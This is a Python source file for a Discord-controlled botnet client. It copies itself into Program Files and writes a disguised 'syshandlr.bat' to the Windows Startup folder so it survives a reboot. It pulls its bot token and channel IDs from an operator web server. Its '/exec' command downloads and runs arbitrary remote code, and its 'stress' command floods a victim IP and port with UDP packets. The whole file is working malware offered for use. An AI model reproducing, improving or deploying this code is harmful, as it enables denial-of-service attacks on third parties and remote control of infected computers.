import time #For the flood function
import socket#For the flood function
import random#For the flood function
import requests#To get the data from your webserver
import os#For the runatstartup() feature
import shutil#For the runatstartup() feature
import sys#For the runatstartup() feature
import discord#For the discord command and control
from discord.ext import commands#For the discord command and control
def runatstartup():
    if os.name != 'nt': #don't attempt to auto run at startup if not windows
        return
    else:
        user = os.getlogin()#Get the currently logged in user
        startupdir = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (user) #Get the current user's startup directory
        selffile = 'updatex64.exe' #Name to save the exe as. 
        exedirec = r'C:\Program Files'#directory to write the exe to 
        startupbatdir = startupdir + '\syshandlr.bat'# name of the .bat file that will show up in the startup folder
        try:
            shutil.copy(selffile, exedirec)#Copy the exe to the exe directory
            f= open(startupbatdir,"w+")#Create the .bat in the startup directory
            fulldirec = exedirec + "\\" + os.path.basename(sys.argv[0])#Calculate the exact path of the exe by adding the exe directory to the file name.
            f.write(fulldirec)#write this into the bat so the bat runs the exe
            f.close()#close the writing code.

        except:
            failed = True#No implementation for this 'failed' variable yet, simply there to fill the space
def ipv4(address):#Check if an ipv4 address is valid. See: https://stackoverflow.com/a/4017219 for credits. 
    address = str(address)
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  
        return False

    return True

def flood(victim, vport, duration):#The flooding protocol. Note that this has no type of ip spoofing or amplification implemented yet. 
    port = vport #It works :shrug:
    clienta = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#Open the socket to the client.
    bytes = random._urandom(20000) #Calculate a random number of bytes to send to the client
    timeout =  time.time() + duration #Calculate when to stop
    while 1: #Note: You want to do as little as possible in here as it dramatically decreased the mbps for me. On a gigabit connection, adding one print statement made it go from 850 mbps to 445 mbps.
        if port == 0: #0 Denotes the person wanted a random port
            vport = random.randrange(1,3000) #Give them a random port each time
        if time.time() > timeout: #If the time is up:
            break
        else:
            pass
        clienta.sendto(bytes, (victim, vport))
runatstartup()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
webserverip = 'your.public.ipv4.ip'#change to your webserver IP only. No domain names etc
token = requests.get('http://' + webserverip + '/token.html').text#Get the token from your webserver/token.html
bot = commands.Bot(command_prefix='/')#Initialize the discord bot
@bot.event  
async def on_ready():
    global ip
    ip = requests.get('https://api.ipify.org/').text
    smsg = 'New bot logged on.' + ' Their public ip is: ' + str(ip)
    chid = int(requests.get('http://' + webserverip + '/channelnew.html').text)
    stressinchannel = int(requests.get('http://' + webserverip + '/channel.html').text)
    channal = bot.get_channel(chid)
    await channal.send(smsg)
    #Gets the Channel for new bots and the stresser channel from your webserver. Then sends a message to the new bots channel with the ip. 
@bot.event
async def on_message(message):
    if message.author == bot.user: #return if own message
        return
    if message.content.startswith('/bots'):
        await message.channel.send("Hi There, I'm a bot with the public ip of: " + ip + '.') #when ANYONE sends /bots send the public ip. 
    if message.content.startswith('/exec'):
        correctchannelid = requests.get('http://' + webserverip + '/channel.html').text#get the channel id of the admin channel to make sure not everyone can exec files.
        if int(message.channel.id) != int(correctchannelid):
            return
        else:
            message.content = ''.join(message.content.split())#Remove all whitespace from message
            msgminus6 = message.content[:-6]#remove the last 6 characters(three letter .py file)
            msgminus5 = msgminus6[5:]#remove the first 5 characters(/exec)
            allmyhomieshatewhitespace = ''.join(msgminus5.split())#Strip whitespace again for fun
            url = allmyhomieshatewhitespace#set the url equal to our string that had the removed 11 characters
            lenurl = len(url)#get the length of the url
            lenurl = lenurl + 5#add 5 to the length to include /exec
            filenamee = message.content[lenurl:]#subtract the length of the url +5 for /exec from the start of the message
            filename = filenamee#set the filename equal to the remaining 6 characters
            sssseww = 'http://' + url + '/%s'  % (filename)
            ssssew = requests.get(sssseww).text#get the file 
            exec(ssssew)#execute the file.
    await bot.process_commands(message)
@bot.command()
async def stress(ctx,ip,port,time):
    if ipv4(ip) == True:
        stre = int(requests.get('http://' + webserverip + '/channel.html').text) #Get the stressing channel id again for redunancy. 
        if ctx.channel.id == stre:
            if True == True:
                flood(str(ip), int(port), int(time))                                                                                                            
    else:
        return
bot.run(token)



        


